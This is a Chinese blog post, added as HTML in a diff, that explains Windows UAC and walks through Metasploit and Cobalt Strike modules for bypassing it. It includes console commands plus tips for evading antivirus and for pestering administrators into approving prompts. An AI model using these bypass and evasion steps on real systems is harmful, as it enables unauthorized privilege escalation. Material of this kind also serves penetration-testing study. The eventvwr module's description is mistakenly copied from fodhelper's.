@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="UACuac用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。 即在权限不够的情况下，访问系统磁盘的根目录、win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网学习--UAC">
+<meta property="og:url" content="http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/index.html">
+<meta property="og:site_name" content="steady&#39;s blog">
+<meta property="og:description" content="UACuac用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。 即在权限不够的情况下，访问系统磁盘的根目录、win">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-20T05:09:14.000Z">
+<meta property="article:modified_time" content="2020-11-21T08:16:11.187Z">
+<meta property="article:author" content="steady">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网学习--UAC</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&text=内网学习--UAC"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&is_video=false&description=内网学习--UAC"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网学习--UAC&body=Check out this article: http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&name=内网学习--UAC&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&t=内网学习--UAC"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UAC"><span class="toc-number">1.</span> <span class="toc-text">UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#uac"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">uac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uac%E7%AD%89%E7%BA%A7"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">uac等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E4%BC%9A%E8%A7%A6%E5%8F%91UAC%E6%8E%88%E6%9D%83%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">将会触发UAC授权的操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84UAC%E7%AD%89%E7%BA%A7"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">查看当前用户的UAC等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC-Bypass"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">UAC Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit%E7%BB%95%E8%BF%87UAC"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">Metasploit绕过UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.1.</span> <span class="toc-text">bypassuac模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RunAs%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.2.</span> <span class="toc-text">RunAs模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-injection%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.3.</span> <span class="toc-text">bypassuac_injection模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-fodhelper%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.4.</span> <span class="toc-text">bypassuac_fodhelper模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-eventvwr%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.5.</span> <span class="toc-text">bypassuac_eventvwr模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-comhijack%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.6.</span> <span class="toc-text">bypassuac_comhijack模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike%E7%BB%95%E8%BF%87UAC"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">Cobalt Strike绕过UAC</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网学习--UAC
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">steady</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-20T05:09:14.000Z" itemprop="datePublished">2020-11-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><h4 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h4><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p>
+<p>即在权限不够的情况下，访问系统磁盘的根目录、window目录、Program File目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC认证。</p>
+<p>注意</p>
+<p>在其Windows Vista及更高版本操作系统中才会有UAC,Windows Vista是微软公司所研发的具有重大创新意义的一个版本，其内核版本号为Windows NT 6.0。</p>
+<p>具体的windows版本可以查看<code>https://blog.csdn.net/jincf2011/article/details/6696133</code>。</p>
+<p>如果要获取管理员权限，可以通过以下几条：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，进程已经拥有管理权限控制；</span><br><span class="line">2，进程被用户允许通过管理员权限运行。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="uac等级"><a href="#uac等级" class="headerlink" title="uac等级"></a>uac等级</h4><ul>
+<li><p>始终通知：最严格的设置，每当程序需要使用高级别的权限的时候都会提示本地用户。</p>
+</li>
+<li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默设置。当本地的Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户。</p>
+</li>
+<li><p>仅在程序试图更改我的计算机时通知我(不降低桌面亮度)：与上一条设置的要求相同，但是在提示时用户不简单桌面的亮度。</p>
+</li>
+<li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。</p>
+</li>
+</ul>
+<h4 id="将会触发UAC授权的操作"><a href="#将会触发UAC授权的操作" class="headerlink" title="将会触发UAC授权的操作"></a>将会触发UAC授权的操作</h4><ol>
+<li>配置Windows Update</li>
+<li>增加或删除用户账户</li>
+<li>改变用户的账户类型</li>
+<li>改变UAC设置</li>
+<li>安装ActiveX</li>
+<li>安装或移除程序</li>
+<li>安装设备驱动程序</li>
+<li>设置家长控制</li>
+<li>将文件移动或复制到Program Files或Windows目录</li>
+<li>查看其他用户文件夹</li>
+</ol>
+<h4 id="查看当前用户的UAC等级"><a href="#查看当前用户的UAC等级" class="headerlink" title="查看当前用户的UAC等级"></a>查看当前用户的UAC等级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WHOAMI &#x2F;Groups | FIND &quot;S-1-16&quot;</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label S-1-16-8192</span><br></pre></td></tr></table></figure>
+
+<h4 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1，白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等。</span><br><span class="line">2，DLL 劫持；</span><br><span class="line">3，Windows 自身漏洞提权；</span><br><span class="line">4，远程注入；</span><br><span class="line">5，COM 接口技术。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Metasploit绕过UAC"><a href="#Metasploit绕过UAC" class="headerlink" title="Metasploit绕过UAC"></a>Metasploit绕过UAC</h4><h5 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h5><p>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li>使用bypassuac模块进行提权时，系统当前用户必须在管理员组。</li>
+<li>用户账户控制程序UAC设置为默认，即”仅在程序试图更改我的计算机时通知我”。</li>
+</ul>
+<h5 id="RunAs模块"><a href="#RunAs模块" class="headerlink" title="RunAs模块"></a>RunAs模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li><p>use exploit/windows/local/bypassuac_injection</p>
+<p>set target  1         #设置目标系统类型，1是64位，0是32位</p>
+</li>
+<li><p>使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。<br>使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。</p>
+<p>RunAs攻击的缺点是，程序企图修改计算机设置时，系统会对用户发出提醒。此警报可能会被管理人员认定为攻击。建议多次运行，系统多次对用户发出提醒后，对于缺乏安全意识或不厌其烦的管理人员会点击“是”，从而完成权限提升。</p>
+</li>
+</ul>
+<h5 id="bypassuac-injection模块"><a href="#bypassuac-injection模块" class="headerlink" title="bypassuac_injection模块"></a>bypassuac_injection模块</h5><p>内存注入，bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>模块的使用需要选择正确的架构。</li>
+</ul>
+<h5 id="bypassuac-fodhelper模块"><a href="#bypassuac-fodhelper模块" class="headerlink" title="bypassuac_fodhelper模块"></a>bypassuac_fodhelper模块</h5><p>通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<h5 id="bypassuac-eventvwr模块"><a href="#bypassuac-eventvwr模块" class="headerlink" title="bypassuac_eventvwr模块"></a>bypassuac_eventvwr模块</h5><p>该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<h5 id="bypassuac-comhijack模块"><a href="#bypassuac-comhijack模块" class="headerlink" title="bypassuac_comhijack模块"></a>bypassuac_comhijack模块</h5><p>模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows UAC。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cobalt-Strike绕过UAC"><a href="#Cobalt-Strike绕过UAC" class="headerlink" title="Cobalt Strike绕过UAC"></a>Cobalt Strike绕过UAC</h4><p>当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 <code>run whoami /groups</code> 命令，查看当前用户组，如果权限不够，需要先提权，至 <code>Administrator</code> 或者 <code>SYSTEM</code> 权限。然后再通过 <code>elevate</code> 命令使用这些 Bypass UAC 的模块。</p>
+<p>右击一个beacon-&gt;执行-&gt;提权-&gt;选择监听器-&gt;选择exp<code>uac-token-duplication</code>。</p>
+<p>也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elevate uac-token-duplication beacon名字</span><br></pre></td></tr></table></figure>
+
+<p>如果Bypass UAC 的 Beacon shell 是普通用户权限，我们需要在目标机器上点击弹出的对话框来确定是否更改UAC。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UAC"><span class="toc-number">1.</span> <span class="toc-text">UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#uac"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">uac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uac%E7%AD%89%E7%BA%A7"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">uac等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E4%BC%9A%E8%A7%A6%E5%8F%91UAC%E6%8E%88%E6%9D%83%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">将会触发UAC授权的操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84UAC%E7%AD%89%E7%BA%A7"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">查看当前用户的UAC等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC-Bypass"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">UAC Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit%E7%BB%95%E8%BF%87UAC"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">Metasploit绕过UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.1.</span> <span class="toc-text">bypassuac模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RunAs%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.2.</span> <span class="toc-text">RunAs模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-injection%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.3.</span> <span class="toc-text">bypassuac_injection模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-fodhelper%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.4.</span> <span class="toc-text">bypassuac_fodhelper模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-eventvwr%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.5.</span> <span class="toc-text">bypassuac_eventvwr模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bypassuac-comhijack%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.0.6.6.</span> <span class="toc-text">bypassuac_comhijack模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike%E7%BB%95%E8%BF%87UAC"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">Cobalt Strike绕过UAC</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&text=内网学习--UAC"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&is_video=false&description=内网学习--UAC"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网学习--UAC&body=Check out this article: http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/&title=内网学习--UAC"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
